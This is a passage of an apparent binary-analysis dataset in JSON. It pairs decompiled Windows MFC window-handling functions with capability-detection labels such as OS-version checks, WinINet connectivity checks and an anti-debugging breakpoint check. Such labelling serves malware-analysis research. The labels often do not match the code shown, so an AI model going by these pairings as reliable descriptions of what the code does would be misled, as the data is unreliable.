            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nvoid __thiscall fcn.0041832a(int32_t param_1, uint *param_2)\n\n{\n    uint uVar1;\n    \n    if (*(param_1 + 0x10) == 0) {\n        uVar1 = fcn.004182f8(\"InitCommonControls\");\n        uVar1 = (*_sym.imp.KERNEL32.dll_GetProcAddress)(uVar1);\n        *(param_1 + 0x10) = uVar1;\n    }\n    *param_2 = *(param_1 + 0x10);\n    return;\n}\n",
        "token_count": 125
    },
    "004183b7": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check if file exists/0479f02c3c8a4099bfdd7ca8c1e3802e/20122460e93841beb56e12792b6a4896"
        ],
        "decompiled_code": "\nvoid fcn.004183b7(void)\n\n{\n    int32_t unaff_EBP;\n    uint var_20h;\n    uint var_1ch;\n    \n    if (*(unaff_EBP + -0x20) != 2) {\n        fcn.0042f689(0, *(unaff_EBP + -0x1c));\n    }\n    return;\n}\n",
        "token_count": 83
    },
    "004183c8": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nvoid __thiscall fcn.004183c8(int32_t param_1, uint *param_2)\n\n{\n    uint uVar1;\n    \n    if (*(param_1 + 0x14) == 0) {\n        uVar1 = fcn.004182f8(\"InitCommonControlsEx\");\n        uVar1 = (*_sym.imp.KERNEL32.dll_GetProcAddress)(uVar1);\n        *(param_1 + 0x14) = uVar1;\n    }\n    *param_2 = *(param_1 + 0x14);\n    return;\n}\n",
        "token_count": 126
    },
    "00418467": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check if file exists/0479f02c3c8a4099bfdd7ca8c1e3802e/20122460e93841beb56e12792b6a4896"
        ],
        "decompiled_code": "\nvoid fcn.00418467(void)\n\n{\n    uint uVar1;\n    int32_t unaff_EBP;\n    bool bVar2;\n    uint var_24h;\n    uint var_20h;\n    uint var_1ch;\n    \n    if (*(unaff_EBP + -0x24) != 2) {\n        bVar2 = *(unaff_EBP + -0x1c) != 0;\n        if (bVar2) {\n            uVar1 = 0;\n        }\n        else {\n            uVar1 = (*_sym.imp.KERNEL32.dll_GetLastError)();\n        }\n        fcn.0042f689(0, *(unaff_EBP + -0x20));\n        if (!bVar2) {\n            (*_sym.imp.KERNEL32.dll_SetLastError)(uVar1);\n        }\n    }\n    return;\n}\n",
        "token_count": 186
    },
    "00418551": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_4h\n\nvoid __cdecl fcn.00418551(uint arg_8h)\n\n{\n    int32_t iVar1;\n    uint uVar2;\n    int32_t iVar3;\n    uint uVar4;\n    int32_t unaff_EBP;\n    uint var_4h;\n    \n    fcn.004627af(0);\n    iVar1 = fcn.004302e1();\n    if ((*(iVar1 + 0x14) == 0) && (*(unaff_EBP + 8) != 0)) {\n        uVar2 = fcn.00411567(0x430517);\n        iVar3 = fcn.00411579(0x60);\n        *(unaff_EBP + 8) = iVar3;\n        *(unaff_EBP + -4) = 0;\n        if (iVar3 == 0) {\n            uVar4 = 0;\n        }\n        else {\n            uVar4 = fcn.00432b3c(0x492ff0, 0x4182bc, 0x41684f, 0x20, 1);\n        }\n        *(unaff_EBP + -4) = 0xffffffff;\n        *(iVar1 + 0x14) = uVar4;\n        fcn.00411567(uVar2);\n    }\n    fcn.00462887();\n    return;\n}\n",
        "token_count": 311
    },
    "0041866d": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nuint fcn.0041866d(void)\n\n{\n    code *pcVar1;\n    uint uVar2;\n    int32_t iVar3;\n    int32_t iVar4;\n    uint uStack16;\n    \n    iVar3 = fcn.00430e98(0x411e5c);\n    if (iVar3 == 0) {\n        uStack16 = 0x4b62b8;\n        fcn.0046230a(&stack0xfffffff0, 0x4a76e8);\n        pcVar1 = swi(3);\n        uVar2 = (*pcVar1)();\n        return uVar2;\n    }\n    iVar4 = fcn.0043026e();\n    if ((*(iVar4 + 0x14) != '\\0') && (*(iVar3 + 0x28) != 0)) {\n        uStack16 = 0x4186a1;\n        (*_sym.imp.USER32.dll_UnhookWindowsHookEx)();\n        *(iVar3 + 0x28) = 0;\n    }\n    if (*(iVar3 + 0x14) != 0) {\n        *(iVar3 + 0x14) = 0;\n        return 0;\n    }\n    return 1;\n}\n",
        "token_count": 270
    },
    "004186f3": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.004186f3(int32_t *param_1)\n\n{\n    code *pcVar1;\n    int32_t iVar2;\n    int32_t iVar3;\n    int32_t *piVar4;\n    uint var_30h;\n    uint var_2ch;\n    int32_t var_28h;\n    int32_t var_24h;\n    \n    iVar2 = fcn.00426925();\n    if (iVar2 == 0) goto code_r0x0041873e;\n    if (*(iVar2 + 0x20) == param_1) {\n        iVar3 = fcn.0043026e();\n        if (*(iVar3 + 0x14) == '\\0') {\n            iVar3 = fcn.0043026e();\n            if (iVar2 == *(iVar3 + 4)) {\n                iVar3 = fcn.00432e9d();\n                if (iVar3 == 0) goto code_r0x00418733;\n            }\n            fcn.00424e30(0);\n        }\ncode_r0x00418733:\n        *(iVar2 + 0x20) = 0;\n    }\n    if (*(iVar2 + 0x24) == param_1) {\n        *(iVar2 + 0x24) = 0;\n    }\ncode_r0x0041873e:\n    if (param_1[0x12] != NULL) {\n        (**(*param_1[0x12] + 0x50))();\n        param_1[0x12] = 0;\n    }\n    if (param_1[0x13] != NULL) {\n        (**(*param_1[0x13] + 4))(1);\n    }\n    param_1[0x13] = 0;\n    if ((*(param_1 + 0xf) & 1) != 0) {\n        iVar2 = fcn.004302e1();\n        iVar2 = *(iVar2 + 0x3c);\n        if ((iVar2 != 0) && (*(iVar2 + 0x20) != 0)) {\n            fcn.00462290(&var_30h, 0, 0x30);\n            var_28h = param_1[8];\n            var_30h = 0x28;\n            var_2ch = 1;\n            var_24h = var_28h;\n            (*_sym.imp.USER32.dll_SendMessageA)(*(iVar2 + 0x20), 0x405, 0, &var_30h);\n        }\n    }\n    pcVar1 = _sym.imp.USER32.dll_GetWindowLongA;\n    iVar2 = (*_sym.imp.USER32.dll_GetWindowLongA)(param_1[8], 0xfffffffc);\n    fcn.00418521();\n    iVar3 = (*pcVar1)(param_1[8], 0xfffffffc);\n    if (iVar3 == iVar2) {\n        piVar4 = (**(*param_1 + 0xf0))();\n        if (*piVar4 != 0) {\n            (*_sym.imp.USER32.dll_SetWindowLongA)(param_1[8], 0xfffffffc, *piVar4);\n        }\n    }\n    fcn.0041863f();\n    (**(*param_1 + 0x114))();\n    return;\n}\n",
        "token_count": 733
    },
    "004189b9": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nvoid __cdecl\nfcn.004189b9(uint32_t arg_8h, uint32_t arg_ch, uint32_t arg_10h, uint32_t arg_14h, int32_t *lprcDst, int32_t *arg_1ch, \n            int32_t arg_20h)\n\n{\n    int32_t iVar1;\n    uint32_t uVar2;\n    int32_t iVar3;\n    uint32_t uVar4;\n    int32_t iVar5;\n    int32_t *piVar6;\n    int32_t in_ECX;\n    int32_t hWinPosInfo;\n    int32_t lprcSrc;\n    int32_t var_1ch;\n    int32_t var_18h;\n    int32_t var_14h;\n    int32_t var_10h;\n    int32_t var_ch;\n    int32_t var_8h;\n    int32_t var_4h;\n    \n    var_4h = 0;\n    var_8h = arg_20h;\n    var_ch = 0;\n    var_10h = 0;\n    if (arg_1ch == NULL) {\n        (*_sym.imp.USER32.dll_GetClientRect)(*(in_ECX + 0x20), &lprcSrc);\n    }\n    else {\n        lprcSrc = *arg_1ch;\n        var_1ch = arg_1ch[1];\n        var_18h = arg_1ch[2];\n        var_14h = arg_1ch[3];\n    }\n    uVar2 = arg_14h & 0xffff7fff;\n    if (uVar2 == 1) {\n        hWinPosInfo = 0;\n    }\n    else {\n        hWinPosInfo = (*_sym.imp.USER32.dll_BeginDeferWindowPos)(8);\n    }\n    for (iVar3 = (*_sym.imp.USER32.dll_GetTopWindow)(*(in_ECX + 0x20)); iVar3 != 0;\n        iVar3 = (*_sym.imp.USER32.dll_GetWindow)(iVar3, 2)) {\n        uVar4 = (*_sym.imp.USER32.dll_GetDlgCtrlID)(iVar3);\n        uVar4 = uVar4 & 0xffff;\n        iVar5 = fcn.004185ec(iVar3);\n        iVar1 = iVar3;\n        if ((((uVar4 != arg_10h) && (iVar1 = var_4h,  arg_8h <= uVar4)) && (uVar4 <= arg_ch)) && (iVar5 != 0)) {\n            (*_sym.imp.USER32.dll_SendMessageA)(iVar3, 0x361, 0, &hWinPosInfo);\n            iVar1 = var_4h;\n        }\n        var_4h = iVar1;\n    }\n    if (uVar2 == 1) {\n        if (arg_20h == 0) {\n            lprcDst[2] = var_10h;\n            lprcDst[1] = 0;\n            *lprcDst = 0;\n            lprcDst[3] = var_ch;\n        }\n        else {\n            (*_sym.imp.USER32.dll_CopyRect)(lprcDst, &lprcSrc);\n        }\n    }\n    else {\n        if ((arg_10h != 0) && (var_4h != 0)) {\n            piVar6 = fcn.004185c5(var_4h);\n            if (uVar2 == 2) {\n                lprcSrc = lprcSrc + *lprcDst;\n                var_1ch = var_1ch + lprcDst[1];\n                var_18h = var_18h - lprcDst[2];\n                var_14h = var_14h - lprcDst[3];\n            }\n            if ((arg_14h & 0x8000) == 0) {\n                (**(*piVar6 + 0x68))(&lprcSrc, 0);\n                fcn.00416336(&hWinPosInfo, var_4h, &lprcSrc);\n            }\n        }\n        if (hWinPosInfo != 0) {\n            (*_sym.imp.USER32.dll_EndDeferWindowPos)(hWinPosInfo);\n        }\n    }\n    return;\n}\n",
        "token_count": 944
    },
    "00418c08": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nint32_t * __cdecl fcn.00418c08(uint arg_8h, uint arg_ch)\n\n{\n    int32_t *piVar1;\n    int32_t iVar2;\n    int32_t *in_ECX;\n    int32_t *var_4h;\n    \n    var_4h = in_ECX;\n    if (*(in_ECX + 9) != '\\0') {\n        var_4h = NULL;\n        iVar2 = (**(*in_ECX + 0xe4))(arg_8h, arg_ch, &var_4h);\n        if (-1 < iVar2) {\n            return var_4h;\n        }\n    }\n    piVar1 = fcn.00418521();\n    return piVar1;\n}\n",
        "token_count": 162
    },
    "00418eb5": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check if file exists/0479f02c3c8a4099bfdd7ca8c1e3802e/20122460e93841beb56e12792b6a4896"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_4h\n// WARNING: Variable defined which should be unmapped: var_14h\n\nvoid __cdecl fcn.00418eb5(uint arg_8h, uint arg_ch, uint arg_10h, uint arg_14h, uint arg_18h)\n\n{\n    int32_t *arg_8h_00;\n    int32_t iVar1;\n    uint uVar2;\n    int32_t iVar3;\n    int32_t iVar4;\n    int32_t extraout_EDX;\n    int32_t unaff_EBP;\n    uint *puVar5;\n    uint *puVar6;\n    uint var_44h;\n    uint var_28h;\n    uint var_14h;\n    uint var_4h;\n    \n    fcn.004627e2(0x38);\n    iVar1 = fcn.00430e98(0x411e5c);\n    iVar4 = 0;\n    *(unaff_EBP + -0x14) = iVar1;\n    if (iVar1 == 0) {\n        fcn.00411e42();\n        iVar4 = extraout_EDX;\n    }\n    puVar5 = iVar1 + 0x58;\n    puVar6 = unaff_EBP + -0x44;\n    for (iVar3 = 7; iVar3 != 0; iVar3 = iVar3 + -1) {\n        *puVar6 = *puVar5;\n        puVar5 = puVar5 + 1;\n        puVar6 = puVar6 + 1;\n    }\n    iVar3 = *(unaff_EBP + 0x10);\n    arg_8h_00 = *(unaff_EBP + 8);\n    *(iVar1 + 0x58) = *(unaff_EBP + 0xc);\n    *(iVar1 + 0x60) = *(unaff_EBP + 0x14);\n    uVar2 = *(unaff_EBP + 0x18);\n    *(iVar1 + 0x5c) = iVar3;\n    *(iVar1 + 100) = uVar2;\n    *(unaff_EBP + -4) = iVar4;\n    if ((iVar3 == 2) && (arg_8h_00[0x13] != iVar4)) {\n        (**(*arg_8h_00[0x13] + 0x60))(iVar4);\n    }\n    *(unaff_EBP + 8) = 0;\n    if (iVar3 == 0x110) {\n        fcn.00416ede(arg_8h_00, unaff_EBP + -0x28, unaff_EBP + 8);\n    }\n    uVar2 = (**(*arg_8h_00 + 0x108))(iVar3, *(unaff_EBP + 0x14), *(unaff_EBP + 0x18));\n    *(unaff_EBP + 0x18) = uVar2;\n    if (iVar3 == 0x110) {\n        fcn.00418e39(arg_8h_00, unaff_EBP + -0x28, *(unaff_EBP + 8));\n    }\n    puVar5 = unaff_EBP + -0x44;\n    puVar6 = iVar1 + 0x58;\n    for (iVar4 = 7; iVar4 != 0; iVar4 = iVar4 + -1) {\n        *puVar6 = *puVar5;\n        puVar5 = puVar5 + 1;\n        puVar6 = puVar6 + 1;\n    }\n    fcn.00462887();\n    return;\n}\n",
        "token_count": 803
    },
    "00418ff3": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_4h\n\nvoid fcn.00418ff3(void)\n\n{\n    code *pcVar1;\n    code **extraout_ECX;\n    int32_t unaff_EBP;\n    uint var_10h;\n    uint var_4h;\n    \n    fcn.004627af(4);\n    *(unaff_EBP + -0x10) = extraout_ECX;\n    *extraout_ECX = vtable.CWnd.0;\n    *(unaff_EBP + -4) = 0;\n    if ((((extraout_ECX[8] != NULL) && (extraout_ECX != 0x4bb080)) && (extraout_ECX != 0x4bb0d8)) &&\n       ((extraout_ECX != 0x4bb130 && (extraout_ECX != 0x4bb188)))) {\n        fcn.00418804();\n    }\n    if (extraout_ECX[0x13] != NULL) {\n        (**(*extraout_ECX[0x13] + 4))(1);\n    }\n    pcVar1 = extraout_ECX[0x14];\n    if ((pcVar1 != NULL) && (*(pcVar1 + 0x28) == extraout_ECX)) {\n        *(pcVar1 + 0x28) = 0;\n    }\n    *(unaff_EBP + -4) = 0xffffffff;\n    fcn.00411a01();\n    fcn.00462887();\n    return;\n}\n",
        "token_count": 335
    },
    "00419182": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nint32_t * __fastcall fcn.00419182(int32_t *param_1)\n\n{\n    int32_t *piVar1;\n    int32_t iVar2;\n    int32_t *piVar3;\n    \n    if ((param_1 != NULL) && (param_1[8] != 0)) {\n        iVar2 = (**(*param_1 + 0x120))();\n        piVar3 = param_1;\n        if (iVar2 == 0) {\n            param_1 = fcn.00419143();\n            piVar3 = param_1;\n        }\n        while (piVar1 = piVar3,  piVar1 != NULL) {\n            piVar3 = fcn.00419143();\n            param_1 = piVar1;\n        }\n        return param_1;\n    }\n    return NULL;\n}\n",
        "token_count": 183
    },
    "004191c1": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.004191c1(uint arg_8h, uint Msg, uint wParam, uint lParam, int32_t arg_18h, int32_t arg_1ch)\n\n{\n    code *pcVar1;\n    int32_t arg_8h_00;\n    int32_t iVar2;\n    \n    pcVar1 = _sym.imp.USER32.dll_GetTopWindow;\n    for (arg_8h_00 = (*_sym.imp.USER32.dll_GetTopWindow)(arg_8h); arg_8h_00 != 0;\n        arg_8h_00 = (*_sym.imp.USER32.dll_GetWindow)(arg_8h_00, 2)) {\n        if (arg_1ch == 0) {\n            (*_sym.imp.USER32.dll_SendMessageA)(arg_8h_00, Msg, wParam, lParam);\n        }\n        else {\n            iVar2 = fcn.004185ec(arg_8h_00);\n            if (iVar2 != 0) {\n                fcn.00418eb5(iVar2, *(iVar2 + 0x20), Msg, wParam, lParam);\n            }\n        }\n        if (arg_18h != 0) {\n            iVar2 = (*pcVar1)(arg_8h_00);\n            if (iVar2 != 0) {\n                fcn.004191c1(arg_8h_00, Msg, wParam, lParam, arg_18h, arg_1ch);\n            }\n        }\n    }\n    return;\n}\n",
        "token_count": 328
    },
    "004193eb": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nuint __cdecl fcn.004193eb(int32_t arg_8h, int32_t arg_ch, ushort *arg_10h)\n\n{\n    int32_t iVar1;\n    int32_t iVar2;\n    int32_t *piVar3;\n    int32_t iVar4;\n    uint uVar5;\n    int32_t in_ECX;\n    int32_t var_8h;\n    int32_t var_4h;\n    \n    var_8h = in_ECX;\n    var_4h = in_ECX;\n    if (*(in_ECX + 0x4c) != 0) {\n        var_8h = arg_8h;\n        var_4h = arg_ch;\n        (*_sym.imp.USER32.dll_ScreenToClient)(*(in_ECX + 0x20), &var_8h);\n        iVar2 = fcn.00419335();\n        if (*(in_ECX + 0x4c) != 0) {\n            iVar1 = *(*(in_ECX + 0x4c) + 0x44);\n            while (iVar1 != 0) {\n                piVar3 = fcn.00416670();\n                iVar4 = *(*piVar3 + 4);\n                if ((iVar4 != 0) && (*(iVar4 + 0x74) != 0)) {\n                    iVar2 = iVar2 + 1;\n                    iVar4 = (*_sym.imp.USER32.dll_PtInRect)(iVar4 + 0x30, var_8h, var_4h);\n                    if (iVar4 != 0) {\n                        *arg_10h = 3;\n                        *(arg_10h + 4) = iVar2;\n                        return 0;\n                    }\n                }\n            }\n        }\n    }\n    uVar5 = fcn.00416689(arg_8h, arg_ch, arg_10h);\n    return uVar5;\n}\n",
        "token_count": 415
    },
    "0041948f": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check for software breakpoints/6dbbe1bd09a145a7938dedb5765a94dc"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_4h\n// WARNING: Variable defined which should be unmapped: var_38h\n// WARNING: Variable defined which should be unmapped: var_34h\n// WARNING: Variable defined which should be unmapped: var_24h\n// WARNING: Variable defined which should be unmapped: var_10h\n\nvoid __cdecl fcn.0041948f(uint arg_8h, uint arg_ch)\n\n{\n    uint uVar1;\n    int32_t iVar2;\n    uint32_t uVar3;\n    int32_t iVar4;\n    int32_t extraout_ECX;\n    int32_t unaff_EBP;\n    uint var_8ch;\n    uint hWnd;\n    uint var_38h;\n    uint var_34h;\n    uint var_24h;\n    uint var_10h;\n    uint var_4h;\n    \n    fcn.004627af(0x80);\n    *(unaff_EBP + -0x10) = extraout_ECX;\n    fcn.004118a5();\n    fcn.00416e9b();\n    uVar1 = *(extraout_ECX + 0x20);\n    *(unaff_EBP + -4) = 0;\n    iVar2 = (*_sym.imp.USER32.dll_GetTopWindow)(uVar1);\n    do {\n        if (iVar2 == 0) {\n            *(unaff_EBP + -4) = 0xffffffff;\n            *(unaff_EBP + -0x6c) = 0;\n            fcn.00418ff3();\n            fcn.00462887();\n            return;\n        }\n        *(unaff_EBP + -0x6c) = iVar2;\n        uVar3 = (*_sym.imp.USER32.dll_GetDlgCtrlID)(iVar2);\n        *(unaff_EBP + -0x34) = uVar3 & 0xffff;\n        *(unaff_EBP + -0x24) = unaff_EBP + -0x8c;\n        iVar4 = fcn.004185ec(iVar2);\n        if (iVar4 == 0) {\ncode_r0x00419502:\n            iVar4 = fcn.00411703(*(unaff_EBP + -0x34), 0xffffffff, unaff_EBP + -0x38, 0);\n            if (iVar4 == 0) {\n                iVar4 = *(unaff_EBP + 0xc);\n                if (iVar4 != 0) {\n                    uVar3 = (*_sym.imp.USER32.dll_SendMessageA)(*(unaff_EBP + -0x6c), 0x87, 0, 0);\n                    if ((uVar3 & 0x2000) != 0) {\n                        uVar3 = fcn.0041be35();\n                        uVar3 = uVar3 & 0xf;\n                        if ((((uVar3 != 3) && (uVar3 != 6)) && (uVar3 != 7)) && (uVar3 != 9)) goto code_r0x00419559;\n                    }\n                    iVar4 = 0;\n                }\ncode_r0x00419559:\n                fcn.004118cb(*(unaff_EBP + 8), iVar4);\n            }\n        }\n        else {\n            iVar4 = fcn.00411703(0, 0xbd11ffff, unaff_EBP + -0x38, 0);\n            if (iVar4 == 0) goto code_r0x00419502;\n        }\n        iVar2 = (*_sym.imp.USER32.dll_GetWindow)(iVar2, 2);\n    } while( true );\n}\n",
        "token_count": 799
    },
    "00419592": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nint32_t __thiscall fcn.00419592(int32_t *param_1, uint param_2)\n\n{\n    int32_t iVar1;\n    int32_t *piVar2;\n    uint unaff_retaddr;\n    \n    iVar1 = fcn.00418606(param_2);\n    if (iVar1 != 0) {\n        (**(*param_1 + 0x50))();\n        piVar2 = (**(*param_1 + 0xf0))();\n        iVar1 = (*_sym.imp.USER32.dll_SetWindowLongA)(unaff_retaddr, 0xfffffffc, fcn.00418fa2);\n        if (*piVar2 == 0) {\n            *piVar2 = iVar1;\n        }\n        iVar1 = 1;\n    }\n    return iVar1;\n}\n",
        "token_count": 176
    },
    "00419c44": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.00419c44(int32_t param_1)\n\n{\n    int32_t iVar1;\n    uint uVar2;\n    \n    if (*(param_1 + 0x50) == 0) {\n        iVar1 = (*_sym.imp.USER32.dll_GetWindowTextLengthA)(*(param_1 + 0x20));\n        uVar2 = fcn.00415261(iVar1, iVar1 + 1);\n        (*_sym.imp.USER32.dll_GetWindowTextA)(*(param_1 + 0x20), uVar2);\n        fcn.00414de4(0xffffffff);\n        return;\n    }\n    // WARNING: Could not recover jumptable at 0x00419c83. Too many branches\n    // WARNING: Treating indirect jump as call\n    (**(**(param_1 + 0x50) + 0x8c))();\n    return;\n}\n",
        "token_count": 199
    },
    "00419f15": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nuint __cdecl fcn.00419f15(uint32_t wParam, int32_t lParam)\n\n{\n    uint uVar1;\n    code *pcVar2;\n    code *pcVar3;\n    int32_t iVar4;\n    uint uVar5;\n    uint uVar6;\n    int32_t in_ECX;\n    uint32_t uVar7;\n    uint hWnd;\n    \n    iVar4 = fcn.00419eed();\n    uVar7 = wParam & 0xfff0;\n    if ((uVar7 == 0xf040) || (uVar7 == 0xf050)) {\n        if (lParam != 0x75) {\n            return 0;\n        }\n        if (iVar4 == 0) {\n            return 0;\n        }\n        fcn.0041bfd7();\n    }\n    else {\n        if ((uVar7 != 0xf060) && (uVar7 != 0xf100)) {\n            return 0;\n        }\n        if (((uVar7 == 0xf060) || (lParam != 0)) && (iVar4 != 0)) {\n            uVar1 = *(in_ECX + 0x20);\n            uVar5 = (*_sym.imp.USER32.dll_GetFocus)();\n            pcVar2 = _sym.imp.USER32.dll_SetActiveWindow;\n            uVar6 = (*_sym.imp.USER32.dll_SetActiveWindow)(*(iVar4 + 0x20));\n            fcn.004185c5(uVar6);\n            (*_sym.imp.USER32.dll_SendMessageA)(*(iVar4 + 0x20), 0x112, wParam, lParam);\n            pcVar3 = _sym.imp.USER32.dll_IsWindow;\n            iVar4 = (*_sym.imp.USER32.dll_IsWindow)(uVar1);\n            if (iVar4 != 0) {\n                (*pcVar2)(uVar1);\n            }\n            iVar4 = (*pcVar3)(uVar5);\n            if (iVar4 != 0) {\n                (*_sym.imp.USER32.dll_SetFocus)(uVar5);\n            }\n        }\n    }\n    return 1;\n}\n",
        "token_count": 455
    },
    "0041a18d": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0041a18d(int32_t arg_8h, uint arg_ch)\n\n{\n    int32_t iVar1;\n    uint uVar2;\n    \n    if (arg_8h == 0) {\n        fcn.00401280(0x80070057);\n    }\n    iVar1 = fcn.00463796(arg_8h, arg_ch);\n    uVar2 = fcn.0040f8a0(iVar1);\n    fcn.004631f3(uVar2, iVar1 + 1, arg_8h, arg_ch);\n    fcn.0040f8d0(iVar1);\n    return;\n}\n",
        "token_count": 147
    },
    "0041a243": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nuint __fastcall fcn.0041a243(int32_t param_1)\n\n{\n    uint uVar1;\n    \n    if (*(param_1 + 0xc) == 0) {\n        return 0;\n    }\n    uVar1 = (**(**(param_1 + 0xc) + 0xc))(*(param_1 + 0xc), 0);\n    return uVar1;\n}\n",
        "token_count": 89
    },
    "0041a274": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nuint fcn.0041a274(int32_t *param_1)\n\n{\n    uint uVar1;\n    \n    if ((((*param_1 == 0) && (param_1[1] == 0)) && (param_1[2] == 0xc0)) && (param_1[3] == 0x46000000)) {\n        uVar1 = 1;\n    }\n    else {\n        uVar1 = 0;\n    }\n    return uVar1;\n}\n",
        "token_count": 109
    },
    "0041a29f": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nint32_t __cdecl fcn.0041a29f(int32_t arg_8h, int32_t *arg_ch, uint arg_10h, int32_t **arg_14h)\n\n{\n    code *pcVar1;\n    int32_t iVar2;\n    int32_t iVar3;\n    int32_t *piVar4;\n    \n    if ((arg_8h == 0) || (arg_ch == NULL)) {\n        iVar2 = -0x7ff8ffa9;\n    }\n    else if (arg_14h == NULL) {\n        iVar2 = -0x7fffbffd;\n    }\n    else {\n        *arg_14h = NULL;\n        iVar2 = fcn.0041a274(arg_10h);\n        if (iVar2 == 0) {\n            for (; pcVar1 = arg_ch[2],  pcVar1 != NULL; arg_ch = arg_ch + 3) {\n                iVar2 = *arg_ch;\n                if ((iVar2 == 0) || (iVar3 = fcn.0041a209(iVar2, arg_10h),  iVar3 != 0)) {\n                    if (pcVar1 == 0x1) goto code_r0x0041a2d3;\n                    iVar3 = (*pcVar1)(arg_8h, arg_10h, arg_14h, arg_ch[1]);\n                    if (iVar3 == 0) {\n                        return 0;\n                    }\n                    if ((iVar2 != 0) && (iVar3 < 0)) {\n                        return iVar3;\n                    }\n                }\n            }\n            iVar2 = -0x7fffbffe;\n        }\n        else {\ncode_r0x0041a2d3:\n            piVar4 = arg_ch[1] + arg_8h;\n            (**(*piVar4 + 